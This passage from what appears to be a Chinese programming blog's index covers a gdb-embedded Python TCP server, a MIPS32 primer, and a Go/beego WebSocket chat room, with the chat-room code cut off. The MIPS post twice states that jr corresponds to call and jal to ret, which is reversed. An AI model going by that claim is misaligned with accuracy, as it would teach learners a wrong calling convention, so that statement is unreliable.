<span class="built_in">print</span>(<span class="string">&#x27;一个新请求到来，来自：%s&#x27;</span> % <span class="built_in">str</span>(client_addr))</span><br><span class="line"></span><br><span class="line">        recv_data = tcp_client_socket.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)   <span class="comment"># 从客户端接受消息，最多1024字节。recv_data为字节类型，.decode()将recv_data转化成字符型</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请求发送的命令是%s&#x27;</span> % recv_data)</span><br><span class="line"></span><br><span class="line">        retMsg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> recv_data == <span class="string">&#x27;start&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;send start to gdb&#x27;</span>)</span><br><span class="line">            retMsg = gdb.execute(<span class="string">&#x27;start&#x27;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">elif</span> recv_data == <span class="string">&#x27;continue&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;send continue to gdb&#x27;</span>)</span><br><span class="line">            retMsg = gdb.execute(<span class="string">&#x27;c&#x27;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;no this commond&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(retMsg)</span><br><span class="line"></span><br><span class="line">        tcp_client_socket.send(retMsg.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 将字符串进行字节编码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭与客户端的连接</span></span><br><span class="line">        tcp_client_socket.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;请求响应完毕&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    tcp_serve_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>通过<code>socket</code>模块，开启一个<code>tcp</code>服务器，然后监听一个端口，接收客户端的请求，并对请求做出响应。</p>
<p>过程中，通过<code>gdb</code>模块中提供给<code>python</code>的<code>api</code>，进行对<code>gdb</code>的调用，如：<code>gdb.execute(&#39;start&#39;, to_string=True)</code> 执行<code>start</code>命令，并返回字符串。更多<code>api</code>见<a href="https://sourceware.org/gdb/onlinedocs/gdb/Python.html#Python">官方文档</a>。</p>
<h3 id="2-运行与结果"><a href="#2-运行与结果" class="headerlink" title="2. 运行与结果"></a>2. 运行与结果</h3><p>假如实现了<code>gdb</code>服务器的代码文件为<code>xxx.py</code>，所在路径为<code>yyy</code>。</p>
<p>运行方法为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb</span><br></pre></td></tr></table></figure>

<p>进入<code>gdb</code>命令行界面，然后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) source xxx.py</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source yyy/xxx.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br><span class="line">gdb</span><br></pre></td></tr></table></figure>

<p>最终结果为：</p>
<p><img src="/%E7%94%A8python%E5%9C%A8gdb%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%99%A8/QQ%E6%88%AA%E5%9B%BE20190406225438.png" alt="用python在gdb中实现一个简单服务器"></p>
<h3 id="3-问题"><a href="#3-问题" class="headerlink" title="3. 问题"></a>3. 问题</h3><p>虽然通过<code>python</code>编写<code>socket</code>服务器，可以实现外界与<code>gdb</code>的交互。但是，这样不优雅，也比较浪费。</p>
<p>同时，在<code>gdb</code>中实现的这个服务端，只是运行当前<code>gdb</code>中的一个扩展。而一个<code>gdb</code>同一时刻只能调试一个文件，该服务器又不可能让外层<code>gdb</code>多线程进行。</p>
<p>所以，任意一个用户访问，都只能得到当前<code>gdb</code>调试的进度和状态。也就是说，<strong>它只能为一个用户服务</strong>。</p>
<p>而要为多用户服务，必须开启多个<code>gdb</code>服务端，但如果只是主机间的进程交互的话，这样是十分低效的。</p>
<p>更高效的方法应该是，用<strong>进程间通讯</strong>代替<code>tcp</code>通讯。</p>
<h3 id="4-更多内容"><a href="#4-更多内容" class="headerlink" title="4. 更多内容"></a>4. 更多内容</h3><p>见<a href="https://github.com/gu-team/gdbServer">https://github.com/gu-team/gdbServer</a></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>简单入门 MIPS</title>
    <url>/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>long long ago，接到一个 x86-64 转 MIPS64 的项目，最近开始。</p>
<p>先简单学习一下 MIPS32 。</p>
<p>参考：<a href="https://www.bilibili.com/video/BV11t411K7Up?t=528&p=46">bilibili - 计算机组成原理（MIPS汇编语言） 袁春风 | 南京大学</a></p>
<span id="more"></span>

<h2 id="1-指令"><a href="#1-指令" class="headerlink" title="1. 指令"></a>1. 指令</h2><h3 id="1-1-MIPS指令概览"><a href="#1-1-MIPS指令概览" class="headerlink" title="1.1. MIPS指令概览"></a>1.1. MIPS指令概览</h3><ul>
<li><p>所有指令都是4字节，指令的地址都是4的倍数。</p>
</li>
<li><p>只有3种指令格式。</p>
</li>
</ul>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/1.png" alt="1"></p>
<h3 id="1-2-3种指令中各字段的含义"><a href="#1-2-3种指令中各字段的含义" class="headerlink" title="1.2. 3种指令中各字段的含义"></a>1.2. 3种指令中各字段的含义</h3><p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/2.png" alt="2"></p>
<h3 id="1-3-各指令的-OP-字段的编码-x2F-解码表"><a href="#1-3-各指令的-OP-字段的编码-x2F-解码表" class="headerlink" title="1.3. 各指令的 OP 字段的编码&#x2F;解码表"></a>1.3. 各指令的 OP 字段的编码&#x2F;解码表</h3><ul>
<li><code>op=000000</code>: <code>R-Type</code></li>
<li><code>op=000010/000011</code>: <code>J-Type</code></li>
<li><code>op=others</code>: <code>I-Type</code></li>
</ul>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/3.png" alt="3"></p>
<h3 id="1-4-R-Type-指令中，func-字段的编码-x2F-解码表"><a href="#1-4-R-Type-指令中，func-字段的编码-x2F-解码表" class="headerlink" title="1.4. R-Type 指令中，func 字段的编码&#x2F;解码表"></a>1.4. R-Type 指令中，func 字段的编码&#x2F;解码表</h3><p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/4.png" alt="3"></p>
<h3 id="1-5-MIPS-寻址方式"><a href="#1-5-MIPS-寻址方式" class="headerlink" title="1.5. MIPS 寻址方式"></a>1.5. MIPS 寻址方式</h3><ul>
<li><code>I-Type</code>：<ul>
<li>基址或变址</li>
<li>相对寻址</li>
</ul>
</li>
<li><code>J-Type</code>：<ul>
<li>伪直接寻址</li>
</ul>
</li>
</ul>
<p>MIPS 寻址方式由 <code>op</code> 字段确定。</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/5.png" alt="3"></p>
<h3 id="1-6-二进制与汇编间的转换举例"><a href="#1-6-二进制与汇编间的转换举例" class="headerlink" title="1.6. 二进制与汇编间的转换举例"></a>1.6. 二进制与汇编间的转换举例</h3><p>举例：指令二进制码转汇编形式：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/7.png" alt="3"></p>
<p>举例：汇编形式转成二进制码：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/8.png" alt="3"></p>
<h3 id="1-7-运算指令"><a href="#1-7-运算指令" class="headerlink" title="1.7. 运算指令"></a>1.7. 运算指令</h3><p>MIPS没有标志位。</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/12.png" alt="pic"></p>
<p>运算指令举例（若立即数大于16位，会有专门的指令去处理）：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/13.png" alt="pic"></p>
<h3 id="1-8-数据传送指令"><a href="#1-8-数据传送指令" class="headerlink" title="1.8. 数据传送指令"></a>1.8. 数据传送指令</h3><p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/14.png" alt="pic"></p>
<p>数据传送指令举例：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/15.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/16.png" alt="pic"></p>
<h3 id="1-9-跳转指令"><a href="#1-9-跳转指令" class="headerlink" title="1.9. 跳转指令"></a>1.9. 跳转指令</h3><ul>
<li><p>MIPS中 <code>jr</code> 相当于 <code>call</code> 指令，<code>jal</code> 相当于 <code>ret</code> 指令。</p>
</li>
<li><p>MIPS中只有等于和不等于两种分支跳转指令。</p>
</li>
</ul>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/17.png" alt="pic"></p>
<p>举例：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/18.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/19.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/20.png" alt="pic"></p>
<h2 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h2><p>32个已编号的寄存器，3个特殊寄存器<code>HI</code>、<code>LO</code>、<code>PC</code>。</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/10.png" alt="pic"></p>
<p>32个寄存器的功能定义：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/6.png" alt="pic"></p>
<h2 id="3-存储器"><a href="#3-存储器" class="headerlink" title="3. 存储器"></a>3. 存储器</h2><p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/11.png" alt="pic"></p>
<h2 id="4-过程调用"><a href="#4-过程调用" class="headerlink" title="4. 过程调用"></a>4. 过程调用</h2><p>示例与问题：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/21.png" alt="pic"></p>
<h3 id="4-1-MIPS的过程调用"><a href="#4-1-MIPS的过程调用" class="headerlink" title="4.1. MIPS的过程调用"></a>4.1. MIPS的过程调用</h3><ul>
<li><code>jr</code> 相当于 <code>call</code> 指令，<code>jal</code> 相当于 <code>ret</code> 指令。</li>
<li>参数放在 <code>$a0~$a3</code> 寄存器中，返回值放在 <code>$v0~$v1</code> 寄存器中，多余的放在栈上。</li>
<li>返回地址放在 <code>$ra</code> 即31号寄存器中。</li>
</ul>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/22.png" alt="pic"></p>
<h3 id="4-2-MIPS的栈"><a href="#4-2-MIPS的栈" class="headerlink" title="4.2. MIPS的栈"></a>4.2. MIPS的栈</h3><ul>
<li>没有 <code>push</code> 和 <code>pop</code> 指令。</li>
</ul>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/23.png" alt="pic"></p>
<h3 id="4-3-MIPS过程调用中寄存器的约定"><a href="#4-3-MIPS过程调用中寄存器的约定" class="headerlink" title="4.3. MIPS过程调用中寄存器的约定"></a>4.3. MIPS过程调用中寄存器的约定</h3><p>被调用者需要保存的寄存器：</p>
<ul>
<li><code>$ra</code> 返回地址寄存器</li>
<li><code>$s0~$s7</code> 保存寄存器</li>
</ul>
<p>调用者需要保存的寄存器：</p>
<ul>
<li><code>$a0~$a3</code> 参数寄存器</li>
<li><code>$fp</code> 帧指针寄存器（栈底寄存器）</li>
<li><code>$t0~$t9</code> 临时寄存器</li>
</ul>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/24.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/25.png" alt="pic"></p>
<p>示例一：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/26.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/27.png" alt="pic"></p>
<p>示例二：</p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/28.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/29.png" alt="pic"></p>
<p><img src="/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS/30.png" alt="pic"></p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>计算机系统</tag>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title>用go实现聊天室(WebSocket方式)</title>
    <url>/%E7%94%A8beego%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4-WebSocket%E6%96%B9%E5%BC%8F.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚入门<code>go</code>语言和<code>beego</code>框架，通过一个简单聊天室的实现，来趁热练习。</p>
<p>详细代码见<a href="https://github.com/99MyCql/chatRoom">github</a>。</p>
<span id="more"></span>

<h3 id="一、WebSocket协议"><a href="#一、WebSocket协议" class="headerlink" title="一、WebSocket协议"></a>一、WebSocket协议</h3><p>在实现之前，我们需要解决一个底层问题。</p>
<p>总所周知，<code>HTTP协议</code>是单向传输协议，只能由客户端<strong>主动</strong>向服务端发送信息，反之则不行。而在聊天室中，一个用户发送一条消息，服务器则需要将该条消息广播到聊天室中的所有用户，这想通过HTTP协议实现是不可能的。</p>
<p>除非，让每个用户每隔一段时间便请求一次服务器获取新消息。这种方式称为<strong>长轮询</strong>。但其缺点十分明显，非常消耗资源。</p>
<p>为了解决这个问题，<code>WebSocket协议</code>应运而生。</p>
<p>那什么是<code>WebSocket协议</code>呢？<a href="https://baike.baidu.com/item/WebSocket/1953845?fr=aladdin">百度百科</a></p>
<p><code>WebSocket协议</code>与<code>HTTP协议</code>同属于应用层协议。不同的是，<code>WebSocket</code>是双向传输协议，弥补了这个缺点，在该协议下，<strong>服务端也能主动向客户端发送信息</strong>。同时，一旦连接，客户端会与服务端保持长时间的通讯。</p>
<p><code>WebSocket协议</code>的标识符是<code>ws</code>，如：<code>ws://localhost:8080/chatRoom/WS</code></p>
<h3 id="二、go语言并发特性"><a href="#二、go语言并发特性" class="headerlink" title="二、go语言并发特性"></a>二、go语言并发特性</h3><p><code>go</code>语言的一大特性，便是内置的并发功能(<code>goroutine</code>)。以及，在并发个体之间传递数据的“通道”(<code>chan</code>)。</p>
<p>具体细节不在此赘述。</p>
<h3 id="三、beego框架"><a href="#三、beego框架" class="headerlink" title="三、beego框架"></a>三、beego框架</h3><p>一个开源的轻量级<code>web server</code>框架，实现了典型的<code>MVC</code>模型，和先进的<code>api</code>接口模型(前后端分离模型)。</p>
<p>聊天室的实现，便基于其<code>MVC</code>模型。</p>
<h3 id="四、实现步骤"><a href="#四、实现步骤" class="headerlink" title="四、实现步骤"></a>四、实现步骤</h3><h4 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1.需求分析"></a>1.需求分析</h4><h5 id="1）数据分析"><a href="#1）数据分析" class="headerlink" title="1）数据分析"></a>1）数据分析</h5><p>聊天室中主要物体分为两种：用户和消息。</p>
<p>用户的主要属性为：姓名、客户端与服务端之间的<code>WebSocket</code>连接指针。</p>
<p>消息则分为三种：用户发消息、有用户加入、有用户离开。若将加入和离开也视为用户发出的消息内容，那消息的主要属性就有：消息类型、消息内容、发消息者。</p>
<h5 id="2）功能分析"><a href="#2）功能分析" class="headerlink" title="2）功能分析"></a>2）功能分析</h5><p>前端：</p>
<ul>
<li>实现与服务端的<code>WebSocket</code>连接。</li>
</ul>
<p>后端：</p>
<ul>
<li><p>提供<code>WebSocket</code>连接接口。与实现<code>HTTP</code>连接接口一样，利用<code>beego</code>框架即可。</p>
</li>
<li><p>当新用户建立连接时、用户断开连接时、收到连接中用户发来的新信息时，能将消息广播给所有连接用户。</p>
</li>
</ul>
<p>客户端(即前端js)若要与服务端建立<code>WebSocket</code>连接，需要调用<code>WebSocket</code>连接API，详细内容见<a href="https://blog.csdn.net/wangzhanzheng/article/details/78603532">大神博客</a>。</p>
<p>服务端(即后端go)实现</p>
<h4 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2.数据结构"></a>2.数据结构</h4><p>用户：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Client <span class="keyword">struct</span> &#123;</span><br><span class="line">    conn *websocket.Conn    <span class="comment">// 用户websocket连接</span></span><br><span class="line">    name <span class="type">string</span>             <span class="comment">// 用户名称</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>消息：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.设置为公开属性(即首字母大写)，是因为属性值私有时，外包的函数无法使用或访问该属性值(如：json.Marshal())</span></span><br><span class="line"><span class="comment">// 2.`json:&quot;name&quot;` 是为了在对该结构类型进行json编码时，自定义该属性的名称</span></span><br><span class="line"><span class="keyword">type</span> Message <span class="keyword">struct</span> &#123;</span><br><span class="line">    EventType <span class="type">byte</span>  <span class="string">`json:&quot;type&quot;`</span>       <span class="comment">// 0表示用户发布消息；1表示用户进入；2表示用户退出</span></span><br><span class="line">    Name <span class="type">string</span>     <span class="string">`json:&quot;name&quot;`</span>       <span class="comment">// 用户名称</span></span><br><span class="line">    Message <span class="type">string</span>  <span class="string">`json:&quot;message&quot;`</span>    <span class="comment">// 消息内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用户组：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">clients = <span class="built_in">make</span>(<span class="keyword">map</span> [Client] <span class="type">bool</span>)      <span class="comment">// 用户组映射</span></span><br></pre></td></tr></table></figure>

<p>此处使用映射而不是数组，是为了方便判断某个用户是否已经加入或者已经退出了。</p>
<p>用于<code>goroutine</code>通道：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此处要设置有缓冲的通道。因为这是goroutine自己从通道中发送并接受数据。</span></span><br><span class="line"><span class="comment">// 若是无缓冲的通道，该goroutine发送数据到通道后就被锁定，需要数据被接受后才能解锁，而恰恰接受数据的又只能是它自己</span></span><br><span class="line">join = <span class="built_in">make</span>(<span class="keyword">chan</span> Client, <span class="number">10</span>)        <span class="comment">// 用户加入通道</span></span><br><span class="line">leave = <span class="built_in">make</span>(<span class="keyword">chan</span> Client, <span class="number">10</span>)       <span class="comment">// 用户退出通道</span></span><br><span class="line">message = <span class="built_in">make</span>(<span class="keyword">chan</span> Message, <span class="number">10</span>)    <span class="comment">// 消息通道</span></span><br></pre></td></tr></table></figure>

<h4 id="3-功能实现"><a href="#3-功能实现" class="headerlink" title="3.功能实现"></a>3.功能实现</h4><h5 id="1）前端WebSocket连接实现："><a href="#1）前端WebSocket连接实现：" class="headerlink" title="1）前端WebSocket连接实现："></a>1）前端<code>WebSocket</code>连接实现：</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//====================webSocket连接======================</span></span><br><span class="line"><span class="comment">// 创建一个webSocket连接</span></span><br><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://&#x27;</span>+<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">host</span>+<span class="string">&#x27;/chatRoom/WS?name=&#x27;</span> + $(<span class="string">&#x27;#name&#x27;</span>).<span class="title function_">text</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当webSocket连接成功的回调函数</span></span><br><span class="line">socket.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;webSocket open&quot;</span>);</span><br><span class="line">    connected = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 断开webSocket连接的回调函数</span></span><br><span class="line">socket.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;webSocket close&quot;</span>);</span><br><span class="line">    connected = <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//=======================接收消息并显示===========================</span></span><br><span class="line"><span class="comment">// 接受webSocket连接中，来自服务端的消息</span></span><br><span class="line">socket.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="comment">// 将服务端发送来的消息进行json解析</span></span><br><span class="line">    <span class="keyword">var</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">data</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;revice:&quot;</span> , data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> name = data.<span class="property">name</span>;</span><br><span class="line">    <span class="keyword">var</span> type = data.<span class="property">type</span>;</span><br><span class="line">    <span class="keyword">var</span> msg = data.<span class="property">message</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// type为0表示有人发消息</span></span><br><span class="line">    <span class="keyword">var</span> $messageDiv;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> $usernameDiv = $(<span class="string">&#x27;&lt;span style=&quot;margin-right: 15px;font-weight: 700;overflow: hidden;text-align: right;&quot;/&gt;&#x27;</span>)</span><br><span class="line">                .<span class="title function_">text</span>(name);</span><br><span class="line">        <span class="keyword">if</span> (name == $(<span class="string">&quot;#name&quot;</span>).<span class="title function_">text</span>()) &#123;</span><br><span class="line">            $usernameDiv.<span class="title function_">css</span>(<span class="string">&#x27;color&#x27;</span>, nameColor);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $usernameDiv.<span class="title function_">css</span>(<span class="string">&#x27;color&#x27;</span>, <span class="title function_">getUsernameColor</span>(name));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> $messageBodyDiv = $(<span class="string">&#x27;&lt;span style=&quot;color: gray;&quot;/&gt;&#x27;</span>)</span><br><span class="line">                .<span class="title function_">text</span>(msg);</span><br><span class="line">        $messageDiv = $(<span class="string">&#x27;&lt;li style=&quot;list-style-type:none;font-size:25px;&quot;/&gt;&#x27;</span>)</span><br><span class="line">                .<span class="title function_">data</span>(<span class="string">&#x27;username&#x27;</span>, name)</span><br><span class="line">                .<span class="title function_">append</span>($usernameDiv, $messageBodyDiv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// type为1或2表示有人加入或退出</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> $messageBodyDiv = $(<span class="string">&#x27;&lt;span style=&quot;color:#999999;&quot;&gt;&#x27;</span>)</span><br><span class="line">                .<span class="title function_">text</span>(msg);</span><br><span class="line">        $messageDiv = $(<span class="string">&#x27;&lt;li style=&quot;list-style-type:none;font-size:15px;text-align:center;&quot;/&gt;&#x27;</span>)</span><br><span class="line">                .<span class="title function_">append</span>($messageBodyDiv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $messageArea.<span class="title function_">append</span>($messageDiv);</span><br><span class="line">    $messageArea[<span class="number">0</span>].<span class="property">scrollTop</span> = $messageArea[<span class="number">0</span>].<span class="property">scrollHeight</span>;   <span class="comment">// 让屏幕滚动</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//========================发送消息==========================</span></span><br><span class="line"><span class="comment">// 通过webSocket发送消息到服务端</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendMessage</span> () &#123;</span><br><span class="line">    <span class="keyword">var</span> inputMessage = $inputArea.<span class="title function_">val</span>();  <span class="comment">// 获取输入框的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inputMessage &amp;&amp; connected) &#123;</span><br><span class="line">        $inputArea.<span class="title function_">val</span>(<span class="string">&#x27;&#x27;</span>);      <span class="comment">// 清空输入框的值</span></span><br><span class="line">        socket.<span class="title function_">send</span>(inputMessage);  <span class="comment">// 基于WebSocket连接发送消息</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;send message:&quot;</span> + inputMessage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2）后端WebSocket连接接口"><a href="#2）后端WebSocket连接接口" class="headerlink" title="2）后端WebSocket连接接口"></a>2）后端<code>WebSocket</code>连接接口</h5><p>继承<code>beego</code>框架的<code>Controller</code>类型：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ServerController <span class="keyword">struct</span> &#123;</span><br><span class="line">    beego.Controller</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写<code>ServerController</code>类型中用于<code>WebSocket</code>连接的方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于与用户间的websocket连接(chatRoom.html发送来的websocket请求)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ServerController)</span></span> WS() &#123;</span><br><span class="line">    name := c.GetString(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) == <span class="number">0</span> &#123;</span><br><span class="line">        beego.Error(<span class="string">&quot;name is NULL&quot;</span>)</span><br><span class="line">        c.Redirect(<span class="string">&quot;/&quot;</span>, <span class="number">302</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检验http头中upgrader属性，若为websocket，则将http协议升级为websocket协议</span></span><br><span class="line">    conn, err := (&amp;websocket.Upgrader&#123;&#125;).Upgrade(c.Ctx.ResponseWriter, c.Ctx.Request, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _, ok := err.(websocket.HandshakeError); ok &#123;</span><br><span class="line">        beego.Error(<span class="string">&quot;Not a websocket connection&quot;</span>)</span><br><span class="line">        http.Error(c.Ctx.ResponseWriter, <span class="string">&quot;Not a websocket handshake&quot;</span>, <span class="number">400</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        beego.Error(<span class="string">&quot;Cannot setup WebSocket connection:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> client Client</span><br><span class="line">    client.name = name</span><br><span class="line">    client.conn = conn</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果用户列表中没有该用户</span></span><br><span class="line">    <span class="keyword">if</span> !clients[client] &#123;</span><br><span class="line">        join &lt;- client</span><br><span class="line">        beego.Info(<span class="string">&quot;user:&quot;</span>, client.name, <span class="string">&quot;websocket connect success!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当函数返回时，将该用户加入退出通道，并断开用户连接</span></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        leave &lt;- client</span><br><span class="line">        client.conn.Close()</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于WebSocket一旦连接，便可以保持长时间通讯，则该接口函数可以一直运行下去，直到连接断开</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 读取消息。如果连接断开，则会返回错误</span></span><br><span class="line">        _, msgStr, err := client.conn.ReadMessage()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果返回错误，就退出循环</span></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        beego.Info(<span class="string">&quot;WS-----------receive: &quot;</span>+<span class="type">string</span>(msgStr))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有错误，则把用户发送的信息放入message通道中</span></span><br><span class="line">        <span class="keyword">var</span> msg Message</span><br><span class="line">        msg.Name = client.name</span><br><span class="line">        msg.EventType = <span class="number">0</span></span><br><span class="line">        msg.Message = <span 